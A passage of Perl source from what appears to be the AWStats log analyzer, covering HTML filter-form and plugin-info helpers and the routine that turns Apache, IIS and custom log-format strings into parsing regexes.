            ? " onmouseover=\"ShowTip($ttnb);\" onmouseout=\"HideTip($ttnb);\""
            : ""
    );
}

#------------------------------------------------------------------------------
# Function:     Insert a form filter
# Parameters:   Name of filter field, default for filter field, default for exclude filter field
# Input:        $StaticLinks, $QueryString, $SiteConfig, $DirConfig
# Output:       HTML Form
# Return:       None
#------------------------------------------------------------------------------
sub HTMLShowFormFilter {
    my $fieldfiltername    = shift;
    my $fieldfilterinvalue = shift;
    my $fieldfilterexvalue = shift;
    if ( !$StaticLinks ) {
        my $NewLinkParams = ${QueryString};
        $NewLinkParams =~ s/(^|&|&amp;)update(=\w*|$)//i;
        $NewLinkParams =~ s/(^|&|&amp;)output(=\w*|$)//i;
        $NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\w*|$)//i;
        $NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
        $NewLinkParams =~ s/^&amp;//;
        $NewLinkParams =~ s/&amp;$//;
        if ($NewLinkParams) { $NewLinkParams = "${NewLinkParams}&amp;"; }
        print "\n<form name=\"FormFilter\" action=\""
            . XMLEncode("$AWScript${NewLinkParams}")
            . "\" class=\"aws_border\">\n";
        print
            "<table valign=\"middle\" width=\"99%\" border=\"0\" cellspacing=\"0\" cellpadding=\"2\"><tr>\n";
        print "<td align=\"left\" width=\"50\">$Message[79]&nbsp;:</td>\n";
        print
            "<td align=\"left\" width=\"100\"><input type=\"text\" name=\"${fieldfiltername}\" value=\"$fieldfilterinvalue\" class=\"aws_formfield\" /></td>\n";
        print "<td> &nbsp; </td>";
        print "<td align=\"left\" width=\"100\">$Message[153]&nbsp;:</td>\n";
        print
            "<td align=\"left\" width=\"100\"><input type=\"text\" name=\"${fieldfiltername}ex\" value=\"$fieldfilterexvalue\" class=\"aws_formfield\" /></td>\n";
        print "<td>";
        print "<input type=\"hidden\" name=\"output\" value=\""
            . join( ',', keys %HTMLOutput )
            . "\" />\n";

        if ($SiteConfig) {
            print
                "<input type=\"hidden\" name=\"config\" value=\"$SiteConfig\" />\n";
        }
        if ($DirConfig) {
            print
                "<input type=\"hidden\" name=\"configdir\" value=\"$DirConfig\" />\n";
        }
        if ( $QueryString =~ /(^|&|&amp;)year=(\d\d\d\d)/i ) {
            print "<input type=\"hidden\" name=\"year\" value=\"$2\" />\n";
        }
        if (   $QueryString =~ /(^|&|&amp;)month=(\d\d)/i
            || $QueryString =~ /(^|&|&amp;)month=(all)/i )
        {
            print "<input type=\"hidden\" name=\"month\" value=\"$2\" />\n";
        }
        if ( $QueryString =~ /(^|&|&amp;)lang=(\w+)/i ) {
            print "<input type=\"hidden\" name=\"lang\" value=\"$2\" />\n";
        }
        if ( $QueryString =~ /(^|&|&amp;)debug=(\d+)/i ) {
            print "<input type=\"hidden\" name=\"debug\" value=\"$2\" />\n";
        }
        if ( $QueryString =~ /(^|&|&amp;)framename=(\w+)/i ) {
            print "<input type=\"hidden\" name=\"framename\" value=\"$2\" />\n";
        }
        if ( $QueryString =~ /(^|&|&amp;)databasebreak=(\w+)/i) {
            print "<input type=\"hidden\" name=\"databasebreak\" value=\"$2\" />\n";
        }
        if ( $QueryString =~ /(^|&|&amp;)day=(\d\d)/i) {
            print "<input type=\"hidden\" name=\"day\" value=\"$2\" />\n";
        }
        if ( $QueryString =~ /(^|&|&amp;)hour=(\d\d)/i) {
            print "<input type=\"hidden\" name=\"hour\" value=\"$2\" />\n";
        }
        print
            "<input type=\"submit\" value=\" $Message[115] \" class=\"aws_button\" /></td>\n";
        print "<td> &nbsp; </td>";
        print "</tr></table>\n";
        print "</form>\n";
        print "<br />\n";
        print "\n";
    }
}

#------------------------------------------------------------------------------
# Function:     Write other user info (with help of plugin)
# Parameters:   $user
# Input:        $SiteConfig
# Output:       URL link
# Return:       None
#------------------------------------------------------------------------------
sub HTMLShowUserInfo {
    my $user = shift;

    # Call to plugins' function ShowInfoUser
    foreach my $pluginname ( sort keys %{ $PluginsLoaded{'ShowInfoUser'} } ) {

        #		my $function="ShowInfoUser_$pluginname('$user')";
        #		eval("$function");
        my $function = "ShowInfoUser_$pluginname";
        &$function($user);
    }
}

#------------------------------------------------------------------------------
# Function:     Write other cluster info (with help of plugin)
# Parameters:   $clusternb
# Input:        $SiteConfig
# Output:       Cluster info
# Return:       None
#------------------------------------------------------------------------------
sub HTMLShowClusterInfo {
    my $cluster = shift;

    # Call to plugins' function ShowInfoCluster
    foreach my $pluginname ( sort keys %{ $PluginsLoaded{'ShowInfoCluster'} } )
    {

        #		my $function="ShowInfoCluster_$pluginname('$user')";
        #		eval("$function");
        my $function = "ShowInfoCluster_$pluginname";
        &$function($cluster);
    }
}

#------------------------------------------------------------------------------
# Function:     Write other host info (with help of plugin)
# Parameters:   $host
# Input:        $LinksToWhoIs $LinksToWhoIsIp
# Output:       None
# Return:       None
#------------------------------------------------------------------------------
sub HTMLShowHostInfo {
    my $host = shift;

    # Call to plugins' function ShowInfoHost
    foreach my $pluginname ( sort keys %{ $PluginsLoaded{'ShowInfoHost'} } ) {

        #		my $function="ShowInfoHost_$pluginname('$host')";
        #		eval("$function");
        my $function = "ShowInfoHost_$pluginname";
        &$function($host);
    }
}

#------------------------------------------------------------------------------
# Function:     Write other url info (with help of plugin)
# Parameters:   $url
# Input:        %Aliases $MaxLengthOfShownURL $ShowLinksOnUrl $SiteDomain $UseHTTPSLinkForUrl
# Output:       URL link
# Return:       None
#------------------------------------------------------------------------------
sub HTMLShowURLInfo {
    my $url     = shift;
    my $nompage = CleanXSS($url);

    # Call to plugins' function ShowInfoURL
    foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowInfoURL'} } ) {

        #		my $function="ShowInfoURL_$pluginname('$url')";
        #		eval("$function");
        my $function = "ShowInfoURL_$pluginname";
        &$function($url);
    }

    if ( length($nompage) > $MaxLengthOfShownURL ) {
        $nompage = substr( $nompage, 0, $MaxLengthOfShownURL ) . "...";
    }
    if ($ShowLinksOnUrl) {
        my $newkey = CleanXSS($url);
        if ( $LogType eq 'W' || $LogType eq 'S' ) {  # Web or streaming log file
            if ( $newkey =~ /^http(s|):/i )
            {    # URL seems to be extracted from a proxy log file
                print "<a href=\""
                    . XMLEncode("$newkey")
                    . "\" target=\"url\" rel=\"nofollow noopener noreferrer\">"
                    . XMLEncode($nompage) . "</a>";
            }
            elsif ( $newkey =~ /^\// )
            { # URL seems to be an url extracted from a web or wap server log file
                $newkey =~ s/^\/$SiteDomain//i;

                # Define urlprot
                my $urlprot = 'http';
                if ( $UseHTTPSLinkForUrl && $newkey =~ /^$UseHTTPSLinkForUrl/ )
                {
                    $urlprot = 'https';
                }
                print "<a href=\""
                    . XMLEncode("$urlprot://$SiteDomain$newkey")
                    . "\" target=\"url\" rel=\"nofollow noopener noreferrer\">"
                    . XMLEncode($nompage) . "</a>";
            }
            else {
                print XMLEncode($nompage);
            }
        }
        elsif ( $LogType eq 'F' ) {    # Ftp log file
            print XMLEncode($nompage);
        }
        elsif ( $LogType eq 'M' ) {    # Smtp log file
            print XMLEncode($nompage);
        }
        else {                         # Other type log file
            print XMLEncode($nompage);
        }
    }
    else {
        print XMLEncode($nompage);
    }
}

#------------------------------------------------------------------------------
# Function:     Define value for PerlParsingFormat (used for regex log record parsing)
# Parameters:   $LogFormat
# Input:        -
# Output:       $pos_xxx, @pos_extra, @fieldlib, $PerlParsingFormat
# Return:       -
#------------------------------------------------------------------------------
sub DefinePerlParsingFormat {
    my $LogFormat = shift;
    $pos_vh = $pos_host = $pos_logname = $pos_date = $pos_tz = $pos_method =
        $pos_url = $pos_code = $pos_size = $pos_time = -1;
    $pos_referer = $pos_agent = $pos_query = $pos_gzipin = $pos_gzipout =
        $pos_compratio   = -1;
    $pos_cluster       = $pos_emails = $pos_emailr = $pos_hostr = -1;
    @pos_extra         = ();
    @fieldlib          = ();
    $PerlParsingFormat = '';

    # Log records examples:
    # Apache combined:             62.161.78.73 user - [dd/mmm/yyyy:hh:mm:ss +0000] "GET / HTTP/1.1" 200 1234 "http://www.from.com/from.htm" "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)"
    # Apache combined (408 error): my.domain.com - user [09/Jan/2001:11:38:51 -0600] "OPTIONS /mime-tmp/xxx file.doc HTTP/1.1" 408 - "-" "-"
    # Apache combined (408 error): 62.161.78.73 user - [dd/mmm/yyyy:hh:mm:ss +0000] "-" 408 - "-" "-"
    # Apache combined (400 error): 80.8.55.11 - - [28/Apr/2007:03:20:02 +0200] "GET /" 400 584 "-" "-"
    # IIS:                         2000-07-19 14:14:14 62.161.78.73 - GET / 200 1234 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+5.01;+Windows+NT+5.0) http://www.from.com/from.htm
    # WebStar:                     05/21/00	00:17:31	OK  	200	212.242.30.6	Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)	http://www.cover.dk/	"www.cover.dk"	:Documentation:graphics:starninelogo.white.gif	1133
    # Squid extended:              12.229.91.170 - - [27/Jun/2002:03:30:50 -0700] "GET http://www.callistocms.com/images/printable.gif HTTP/1.1" 304 354 "-" "Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0" TCP_REFRESH_HIT:DIRECT
    # Log formats:
    # Apache common_with_mod_gzip_info1: %h %l %u %t \"%r\" %>s %b mod_gzip: %{mod_gzip_compression_ratio}npct.
    # Apache common_with_mod_gzip_info2: %h %l %u %t \"%r\" %>s %b mod_gzip: %{mod_gzip_result}n In:%{mod_gzip_input_size}n Out:%{mod_gzip_output_size}n:%{mod_gzip_compression_ratio}npct.
    # Apache deflate: %h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" (%{ratio}n)
    if ($Debug) {
        debug(
            "Call To DefinePerlParsingFormat (LogType='$LogType', LogFormat='$LogFormat')"
        );
    }
    if ( $LogFormat =~ /^[1-6]$/ ) {    # Pre-defined log format
        if ( $LogFormat eq '1' || $LogFormat eq '6' )
        { # Same than "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"".
            # %u (user) is "([^\\/\\[]+)" instead of "[^ ]+" because can contain space (Lotus Notes). referer and ua might be "".

            # $PerlParsingFormat="([^ ]+) [^ ]+ ([^\\/\\[]+) \\[([^ ]+) [^ ]+\\] \\\"([^ ]+) (.+) [^\\\"]+\\\" ([\\d|-]+) ([\\d|-]+) \\\"(.*?)\\\" \\\"([^\\\"]*)\\\"";
            $PerlParsingFormat =
                "([^ ]+) [^ ]+ ([^\\/\\[]+) \\[([^ ]+) [^ ]+\\] \\\"([^ ]+) ([^ ]+)(?: [^\\\"]+|)\\\" ([\\d|-]+) ([\\d|-]+) \\\"(.*?)\\\" \\\"([^\\\"]*)\\\"";
            $pos_host    = 0;
            $pos_logname = 1;
            $pos_date    = 2;
            $pos_method  = 3;
            $pos_url     = 4;
            $pos_code    = 5;
            $pos_size    = 6;
            $pos_referer = 7;
            $pos_agent   = 8;
            @fieldlib    = (
                'host', 'logname', 'date', 'method', 'url', 'code',
                'size', 'referer', 'ua'
            );
        }
        elsif ( $LogFormat eq '2' )
        { # Same than "date time c-ip cs-username cs-method cs-uri-stem sc-status sc-bytes cs-version cs(User-Agent) cs(Referer)"
            $PerlParsingFormat =
                "(\\S+ \\S+) (\\S+) (\\S+) (\\S+) (\\S+) ([\\d|-]+) ([\\d|-]+) \\S+ (\\S+) (\\S+)";
            $pos_date    = 0;
            $pos_host    = 1;
            $pos_logname = 2;
            $pos_method  = 3;
            $pos_url     = 4;
            $pos_code    = 5;
            $pos_size    = 6;
            $pos_agent   = 7;
            $pos_referer = 8;
            @fieldlib    = (
                'date', 'host', 'logname', 'method', 'url', 'code',
                'size', 'ua',   'referer'
            );
        }
        elsif ( $LogFormat eq '3' ) {
            $PerlParsingFormat =
                "([^\\t]*\\t[^\\t]*)\\t([^\\t]*)\\t([\\d|-]*)\\t([^\\t]*)\\t([^\\t]*)\\t([^\\t]*)\\t[^\\t]*\\t([^\\t]*)\\t([\\d]*)";
            $pos_date    = 0;
            $pos_method  = 1;
            $pos_code    = 2;
            $pos_host    = 3;
            $pos_agent   = 4;
            $pos_referer = 5;
            $pos_url     = 6;
            $pos_size    = 7;
            @fieldlib    = (
                'date', 'method',  'code', 'host',
                'ua',   'referer', 'url',  'size'
            );
        }
        elsif ( $LogFormat eq '4' ) {    # Same than "%h %l %u %t \"%r\" %>s %b"
            # %u (user) is "(.+)" instead of "[^ ]+" because can contain space (Lotus Notes).
            # Sample: 10.100.10.45 - BMAA\will.smith [01/Jul/2013:07:17:28 +0200] "GET /Download/__Omnia__Aus- und Weiterbildung__Konsular- und Verwaltungskonferenz, Programm.doc HTTP/1.1" 200 9076810
            #			$PerlParsingFormat =
            #"([^ ]+) [^ ]+ (.+) \\[([^ ]+) [^ ]+\\] \\\"([^ ]+) ([^ ]+)(?: [^\\\"]+|)\\\" ([\\d|-]+) ([\\d|-]+)";
            $PerlParsingFormat =
                "([^ ]+) [^ ]+ (.+) \\[([^ ]+) [^ ]+\\] \\\"([^ ]+) (.+) [^\\\"]+\\\" ([\\d|-]+) ([\\d|-]+)";
            $pos_host    = 0;
            $pos_logname = 1;
            $pos_date    = 2;
            $pos_method  = 3;
            $pos_url     = 4;
            $pos_code    = 5;
            $pos_size    = 6;
            @fieldlib    =
                ( 'host', 'logname', 'date', 'method', 'url', 'code', 'size' );
        }
    }
    elsif ( $LogFormat eq 'json' ) {
        $PerlParsingFormat = 'json';
        $PerlParsingFormatJsonMap = JSON::XS->new->utf8->decode($LogFormatJsonMap);
        @fieldlib = keys % {$PerlParsingFormatJsonMap};
        for my $i (0 .. $#fieldlib) {
            my $f_name = @fieldlib[$i];
            my $pos_var_suf = $f_name;
            if ($f_name =~ /time[12]/) {
                $pos_var_suf = "date";
            } elsif ($f_name =~  /extra([0-9]+)/) {
                $pos_var_suf =~ s/extra//;
                $pos_extra[$pos_var_suf] = $i;
                next;
            }
            my $k = "pos_$pos_var_suf";
            $$k = $i;
        }
    }
    else {    # Personalized log format
        my $LogFormatString = $LogFormat;

        # Replacement for Notes format string that are not Apache
        $LogFormatString =~ s/%vh/%virtualname/g;

        # Replacement for Apache format string
        $LogFormatString =~ s/%v(\s)/%virtualname$1/g;
        $LogFormatString =~ s/%v$/%virtualname/g;
        $LogFormatString =~ s/%h(\s)/%host$1/g;
        $LogFormatString =~ s/%h$/%host/g;
        $LogFormatString =~ s/%l(\s)/%other$1/g;
        $LogFormatString =~ s/%l$/%other/g;
        $LogFormatString =~ s/\"%u\"/%lognamequot/g;
        $LogFormatString =~ s/%u(\s)/%logname$1/g;
        $LogFormatString =~ s/%u$/%logname/g;
        $LogFormatString =~ s/%t(\s)/%time1$1/g;
        $LogFormatString =~ s/%t$/%time1/g;
        $LogFormatString =~ s/\"%r\"/%methodurl/g;
        $LogFormatString =~ s/%>s/%code/g;
        $LogFormatString =~ s/%b(\s)/%bytesd$1/g;
        $LogFormatString =~ s/%b$/%bytesd/g;
        $LogFormatString =~ s/\"%\{Referer}i\"/%refererquot/g;
        $LogFormatString =~ s/\"%\{User-Agent}i\"/%uaquot/g;
        $LogFormatString =~ s/%\{mod_gzip_input_size}n/%gzipin/g;
        $LogFormatString =~ s/%\{mod_gzip_output_size}n/%gzipout/g;
        $LogFormatString =~ s/%\{mod_gzip_compression_ratio}n/%gzipratio/g;
        $LogFormatString =~ s/\(%\{ratio}n\)/%deflateratio/g;

        # Replacement for a IIS and ISA format string
        $LogFormatString =~ s/cs-uri-query/%query/g;    # Must be before cs-uri
        $LogFormatString =~ s/date\stime/%time2/g;
        $LogFormatString =~ s/c-ip/%host/g;
        $LogFormatString =~ s/cs-username/%logname/g;
        $LogFormatString =~ s/cs-method/%method/g;  # GET, POST, SMTP, RETR STOR
        $LogFormatString =~ s/cs-uri-stem/%url/g;
        $LogFormatString =~ s/cs-uri/%url/g;
        $LogFormatString =~ s/sc-status/%code/g;
        $LogFormatString =~ s/sc-bytes/%bytesd/g;
        $LogFormatString =~ s/cs-version/%other/g;  # Protocol
        $LogFormatString =~ s/cs\(User-Agent\)/%ua/g;
        $LogFormatString =~ s/c-agent/%ua/g;
        $LogFormatString =~ s/cs\(Referer\)/%referer/g;
        $LogFormatString =~ s/cs-referred/%referer/g;
        $LogFormatString =~ s/sc-authenticated/%other/g;
        $LogFormatString =~ s/s-svcname/%other/g;
        $LogFormatString =~ s/s-computername/%other/g;
        $LogFormatString =~ s/r-host/%virtualname/g;
        $LogFormatString =~ s/cs-host/%virtualname/g;
        $LogFormatString =~ s/r-ip/%other/g;
        $LogFormatString =~ s/r-port/%other/g;
        $LogFormatString =~ s/time-taken/%other/g;
        $LogFormatString =~ s/cs-bytes/%other/g;
        $LogFormatString =~ s/cs-protocol/%other/g;
        $LogFormatString =~ s/cs-transport/%other/g;
        $LogFormatString =~
            s/s-operation/%method/g;    # GET, POST, SMTP, RETR STOR
        $LogFormatString =~ s/cs-mime-type/%other/g;
        $LogFormatString =~ s/s-object-source/%other/g;
        $LogFormatString =~ s/s-cache-info/%other/g;
        $LogFormatString =~ s/cluster-node/%cluster/g;
        $LogFormatString =~ s/s-sitename/%other/g;
        $LogFormatString =~ s/s-ip/%other/g;
        $LogFormatString =~ s/s-port/%other/g;
        $LogFormatString =~ s/cs\(Cookie\)/%other/g;
        $LogFormatString =~ s/sc-substatus/%other/g;
        $LogFormatString =~ s/sc-win32-status/%other/g;


        # Added for MMS
        $LogFormatString =~
            s/protocol/%protocolmms/g;    # cs-method might not be available
        $LogFormatString =~
            s/c-status/%codemms/g;    # c-status used when sc-status not available
        if ($Debug) { debug(" LogFormatString=$LogFormatString"); }

        # $LogFormatString has an AWStats format, so we can generate PerlParsingFormat variable
        my $i                       = 0;
        my $LogSeparatorWithoutStar = $LogSeparator;
        $LogSeparatorWithoutStar =~ s/[\*\+]//g;
        foreach my $f ( split( /\s+/, $LogFormatString ) ) {

            # Add separator for next field
            if ($PerlParsingFormat) { $PerlParsingFormat .= "$LogSeparator"; }

            # If field is prefixed with custom string, just push it to regex literally
            if ( $f =~ /^([^%]+)%/ ) {
                $PerlParsingFormat .= "$1"
            }

            # Special for logname
            if ( $f =~ /%lognamequot$/ ) {
                $pos_logname = $i;
                $i++;
                push @fieldlib, 'logname';
                $PerlParsingFormat .=
                    "\\\"?([^\\\"]*)\\\"?"
                ; # logname can be "value", "" and - in same log (Lotus notes)
            }
            elsif ( $f =~ /%logname$/ ) {
                $pos_logname = $i;
                $i++;
                push @fieldlib, 'logname';

                # %u (user) is "([^\\/\\[]+)" instead of "[^$LogSeparatorWithoutStar]+" because can contain space (Lotus Notes).
                $PerlParsingFormat .= "([^\\/\\[]+)";
            }

            # Date format
            elsif ( $f =~ /%time1$/ || $f =~ /%time1b$/ )
            { # [dd/mmm/yyyy:hh:mm:ss +0000] or [dd/mmm/yyyy:hh:mm:ss],  time1b kept for backward compatibility
                $pos_date = $i;
                $i++;
                push @fieldlib, 'date';
                $pos_tz = $i;
                $i++;
                push @fieldlib, 'tz';
                $PerlParsingFormat .=
                    "\\[([^$LogSeparatorWithoutStar]+)( [^$LogSeparatorWithoutStar]+)?\\]";
            }
            elsif ( $f =~ /%time2$/ ) {    # yyyy-mm-dd hh:mm:ss
                $pos_date = $i;
                $i++;
                push @fieldlib, 'date';
                $PerlParsingFormat .=
                    "([^$LogSeparatorWithoutStar]+\\s[^$LogSeparatorWithoutStar]+)";                        # Need \s for Exchange log files
            }
            elsif ( $f =~ /%time3$/ )
            { # mon d hh:mm:ss  or  mon  d hh:mm:ss  or  mon dd hh:mm:ss yyyy  or  day mon dd hh:mm:ss  or  day mon dd hh:mm:ss yyyy
                $pos_date = $i;
                $i++;
                push @fieldlib, 'date';
                $PerlParsingFormat .=
                    "(?:\\w\\w\\w )?(\\w\\w\\w \\s?\\d+ \\d\\d:\\d\\d:\\d\\d(?: \\d\\d\\d\\d)?)";
            }
            elsif ( $f =~ /%time4$/ ) {    # ddddddddddddd
                $pos_date = $i;
                $i++;
                push @fieldlib, 'date';
                $PerlParsingFormat .= "(\\d+)";
            }
            elsif ( $f =~ /%time5$/ ) {
                # Supports the following formats:
                # - yyyy-mm-ddThh:mm:ss           (Incomplete ISO 8601)
                # - yyyy-mm-ddThh:mm:ssZ          (ISO 8601, zero meridian)
                # - yyyy-mm-ddThh:mm:ss+00:00     (ISO 8601)
                # - yyyy-mm-ddThh:mm:ss+0000      (Apache's best approximation to ISO 8601 using "%{%Y-%m-%dT%H:%M:%S%z}t" in LogFormat)
                # - yyyy-mm-ddThh:mm:ss.000000Z   (Amazon AWS log files)
                $pos_date = $i;
                $i++;
                push @fieldlib, 'date';
                $pos_tz = $i;
                $i++;
                push @fieldlib, 'tz';
                $PerlParsingFormat .=
                    "([^$LogSeparatorWithoutStar]+T[^$LogSeparatorWithoutStar]+)(Z|[-+\.]\\d\\d[:\\.\\dZ]*)?";
            }
            elsif ( $f =~ /%time6$/ ) {	# dd/mm/yyyy, hh:mm:ss - added additional type to format for IIS date -DWG 12/8/2008
                $pos_date = $i;
                $i++;
                push @fieldlib, 'date';
                $PerlParsingFormat .= "([^,]+,[^,]+)";
            }

            # Special for methodurl, methodurlprot and methodurlnoprot
            elsif ( $f =~ /%methodurl$/ ) {
                $pos_method = $i;
                $i++;
                push @fieldlib, 'method';
                $pos_url = $i;
                $i++;
                push @fieldlib, 'url';
                $PerlParsingFormat .=

                    #"\\\"([^$LogSeparatorWithoutStar]+) ([^$LogSeparatorWithoutStar]+) [^\\\"]+\\\"";
                    "\\\"([^$LogSeparatorWithoutStar]+) ([^$LogSeparatorWithoutStar]+)(?: [^\\\"]+|)\\\"";
            }
            elsif ( $f =~ /%methodurlprot$/ ) {
                $pos_method = $i;
                $i++;
                push @fieldlib, 'method';
                $pos_url = $i;
                $i++;
                push @fieldlib, 'url';
                $PerlParsingFormat .=
                    "\\\"([^$LogSeparatorWithoutStar]+) ([^\\\"]+) ([^\\\"]+)\\\"";
            }
            elsif ( $f =~ /%methodurlnoprot$/ ) {
                $pos_method = $i;
                $i++;
                push @fieldlib, 'method';
                $pos_url = $i;
                $i++;
                push @fieldlib, 'url';
                $PerlParsingFormat .=
                    "\\\"([^$LogSeparatorWithoutStar]+) ([^$LogSeparatorWithoutStar]+)\\\"";
            }

            # Common command tags
            elsif ( $f =~ /%virtualnamequot$/ ) {
                $pos_vh = $i;
                $i++;
                push @fieldlib, 'vhost';
                $PerlParsingFormat .= "\\\"([^$LogSeparatorWithoutStar]+)\\\"";
            }
            elsif ( $f =~ /%virtualname$/ ) {
                $pos_vh = $i;
                $i++;
                push @fieldlib, 'vhost';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }
            elsif ( $f =~ /%host_r$/ ) {
                $pos_hostr = $i;
                $i++;
                push @fieldlib, 'hostr';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }
            elsif ( $f =~ /%host$/ ) {
                $pos_host = $i;
                $i++;
                push @fieldlib, 'host';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }
            elsif ( $f =~ /%host_proxy$/ )
            {    # if host_proxy tag used, host tag must not be used
                $pos_host = $i;
                $i++;
                push @fieldlib, 'host';
                $PerlParsingFormat .= "(.+?)(?:, .*)*";
            }
            elsif ( $f =~ /%method$/ ) {
                $pos_method = $i;
                $i++;
                push @fieldlib, 'method';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }
            elsif ( $f =~ /%url$/ ) {
                $pos_url = $i;
                $i++;
                push @fieldlib, 'url';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }
            elsif ( $f =~ /%query$/ ) {
                $pos_query = $i;
                $i++;
                push @fieldlib, 'query';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }
            elsif ( $f =~ /%code$/ ) {
                $pos_code = $i;
                $i++;
                push @fieldlib, 'code';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }
            elsif ( $f =~ /%bytesd$/ ) {
                $pos_size = $i;
                $i++;
                push @fieldlib, 'size';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }
            elsif ( $f =~ /%rqtime$/ ) {
                $pos_time = $i;
                $i++;
                push @fieldlib, 'requesttime';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }
            elsif ( $f =~ /%refererquot$/ ) {
                $pos_referer = $i;
                $i++;
                push @fieldlib, 'referer';
                $PerlParsingFormat .=
                    "\\\"([^\\\"]*)\\\"";    # referer might be ""
            }
            elsif ( $f =~ /%referer$/ ) {
                $pos_referer = $i;
                $i++;
                push @fieldlib, 'referer';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }
            elsif ( $f =~ /%uaquot$/ ) {
                $pos_agent = $i;
                $i++;
                push @fieldlib, 'ua';
                $PerlParsingFormat .= "\\\"([^\\\"]*)\\\"";    # ua might be ""
            }
            elsif ( $f =~ /%uabracket$/ ) {
                $pos_agent = $i;
                $i++;
                push @fieldlib, 'ua';
                $PerlParsingFormat .= "\\\[([^\\\]]*)\\\]";    # ua might be []
            }
            elsif ( $f =~ /%ua$/ ) {
                $pos_agent = $i;
                $i++;
                push @fieldlib, 'ua';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }
            elsif ( $f =~ /%gzipin$/ ) {
                $pos_gzipin = $i;
                $i++;
                push @fieldlib, 'gzipin';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }
            elsif ( $f =~ /%gzipout/ )
            { # Compare $f to /%gzipout/ and not to /%gzipout$/ like other fields
                $pos_gzipout = $i;
                $i++;
                push @fieldlib, 'gzipout';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }
            elsif ( $f =~ /%gzipratio/ )
            { # Compare $f to /%gzipratio/ and not to /%gzipratio$/ like other fields
                $pos_compratio = $i;
                $i++;
                push @fieldlib, 'gzipratio';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }
            elsif ( $f =~ /%deflateratio/ )
            { # Compare $f to /%deflateratio/ and not to /%deflateratio$/ like other fields
                $pos_compratio = $i;
                $i++;
                push @fieldlib, 'deflateratio';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }
            elsif ( $f =~ /%email_r$/ ) {
                $pos_emailr = $i;
                $i++;
                push @fieldlib, 'email_r';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }
            elsif ( $f =~ /%email$/ ) {
                $pos_emails = $i;
                $i++;
                push @fieldlib, 'email';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }
            elsif ( $f =~ /%cluster$/ ) {
                $pos_cluster = $i;
                $i++;
                push @fieldlib, 'clusternb';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }
            elsif ( $f =~ /%timetaken$/ ) {
                $pos_timetaken = $i;
                $i++;
                push @fieldlib, 'timetaken';
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }

            # Special for protocolmms, used for method if method not already found (for MMS)
            elsif ( $f =~ /%protocolmms$/ ) {
                if ( $pos_method < 0 ) {
                    $pos_method = $i;
                    $i++;
                    push @fieldlib, 'method';
                    $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
                }
            }

            # Special for codemms, used for code only if code not already found (for MMS)
            elsif ( $f =~ /%codemms$/ ) {
                if ( $pos_code < 0 ) {
                    $pos_code = $i;
                    $i++;
                    push @fieldlib, 'code';
                    $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
                }
            }

            # Extra tag
            elsif ( $f =~ /%extra(\d+)$/ ) {
                $pos_extra[$1] = $i;
                $i++;
                push @fieldlib, "extra$1";
                $PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+)";
            }

            # Other tag
            elsif ( $f =~ /%other$/ ) {
                $PerlParsingFormat .= "[^$LogSeparatorWithoutStar]+";
            }
            elsif ( $f =~ /%otherquot$/ ) {
                $PerlParsingFormat .= "\\\"[^\\\"]*\\\"";
            }

            # Unknown tag (no parenthesis)
            else {
                $PerlParsingFormat .= "[^$LogSeparatorWithoutStar]+";
            }
        }
        if ( !$PerlParsingFormat ) {
            error("No recognized format tag in personalized LogFormat string");
        }
    }
    if ( $pos_host < 0 ) {
        error(
            "Your personalized LogFormat does not include all fields required by AWStats (Add \%host in your LogFormat string)."
        );
    }
    if ( $pos_date < 0 ) {
        error(
            "Your personalized LogFormat does not include all fields required by AWStats (Add \%time1 or \%time2 in your LogFormat string)."
        );
    }
    if ( $pos_method < 0 ) {
        error(
            "Your personalized LogFormat does not include all fields required by AWStats (Add \%methodurl or \%method in your LogFormat string)."
        );
    }
    if ( $pos_url < 0 ) {
        error(
            "Your personalized LogFormat does not include all fields required by AWStats (Add \%methodurl or \%url in your LogFormat string)."
        );
    }
    if ( $pos_code < 0 ) {
        error(
            "Your personalized LogFormat does not include all fields required by AWStats (Add \%code in your LogFormat string)."
        );
    }
    #	if ( $pos_size < 0 ) {
    #		error(
    #"Your personalized LogFormat does not include all fields required by AWStats (Add \%bytesd in your LogFormat string)."
    #		);
    #	}
    $PerlParsingFormat = qr/^$PerlParsingFormat/;
    if ($Debug) { debug(" PerlParsingFormat is $PerlParsingFormat"); }
}

#------------------------------------------------------------------------------
# Function:     Prints a menu category for the frame or static header
# Parameters:   -
# Input:        $categ, $categtext, $categicon, $frame, $targetpage, $linkanchor,
#				$NewLinkParams, $NewLinkTarget
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowMenuCateg {
    my ( $categ, $categtext, $categicon, $frame, $targetpage, $linkanchor,
        $NewLinkParams, $NewLinkTarget )
